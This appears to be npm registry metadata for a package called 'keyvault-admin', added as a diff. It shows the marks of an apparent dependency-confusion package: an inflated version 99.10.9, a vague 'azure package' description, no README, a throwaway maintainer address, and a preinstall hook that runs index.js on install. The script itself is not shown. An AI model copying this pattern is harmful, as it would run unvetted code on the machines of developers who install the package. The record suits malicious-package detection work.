@@ -1,0 +1,62 @@
+{
+    "_id": "keyvault-admin",
+    "name": "keyvault-admin",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "keyvault-admin",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "keyvault-admin@99.10.9",
+            "_nodeVersion": "14.16.1",
+            "_npmVersion": "6.14.11",
+            "dist": {
+                "integrity": "sha512-+8OjqP8sYpPbxMx/kgHBpZD2/Ldk4DL3Lg/gLd6P8z3loPxH78jkxrxirFbAcfUovcfAwe8Sbga2JKgWTREGow==",
+                "shasum": "bcc19d60da0c25a60d6326566021a63d41105060",
+                "tarball": "https://registry.npmjs.org/keyvault-admin/-/keyvault-admin-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5063,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNfFMACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmogng//Y4rpvC3N6mM/Q6LoCQLAmCwer2hdmwrL8hlQFQiMvMH5iLGn\r\nH7T+92tEJ9oZQZ8gRrAn17nkoj0nnX571ltBNZ2rV46B1dKK8+YU4VakOw7S\r\ngW2IG6dCwnF9Mut86TCycTKa5Qm5roDbGScsw4MJcezM6aW1BCrl6XsVEgNT\r\nw2vcOpmxF23xMRCEbK7KFT3/m8JcsebG7sWnZUovr+efATYTu1BS428oeVUF\r\nWtnos+Vwkva1yxzHby0uan3UUM6gjT5lzAPZOAns6iwT+DiCAoNHSlcgXZAi\r\n/03fKZoLt2msZA5pP2T9lnDzLrNcESeJWyD9EyixmOMUn8ABLrM6LXSjL0ib\r\n4BAnMLooggu99UQ9xa28g8D7EdgdalYmJWHVAiC0c2X54rpXkoTHJ3y52JFc\r\nHGCgVHN8FM/uXHfb5gJrAQSNfpknSrsBZ/KMLJx6OJTNk3Q6al+A+EcoxhgE\r\nbDTMKUgE5VWEX8gj0zwmcI5CVghhMAMIB4UDPJqZ2pmQ/gejWXR0iICwwt00\r\nio5WchdoI4y+gToldFiIyr4rKgyh37xG7MWkt/vkDUPFFFR1rSgcmoawrvvN\r\nSqyXgZipkJQXRXJXn1lIwzYtQwDTx7cByEYMyEYYeRRp4MwD8yoD3TVsQfwf\r\noa4okkxIn9VfIogWv/kPgZ5TOV2P9N2ly48=\r\n=Z40M\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "uwhjx8tr",
+                "email": "uwhjx8tr@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "uwhjx8tr",
+                    "email": "uwhjx8tr@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/keyvault-admin_99.10.9_1647702348740_0.566632127311433"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-19T15:05:48.740Z",
+        "99.10.9": "2022-03-19T15:05:48.922Z",
+        "modified": "2022-03-19T15:05:49.027Z"
+    },
+    "maintainers": [
+        {
+            "name": "uwhjx8tr",
+            "email": "uwhjx8tr@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
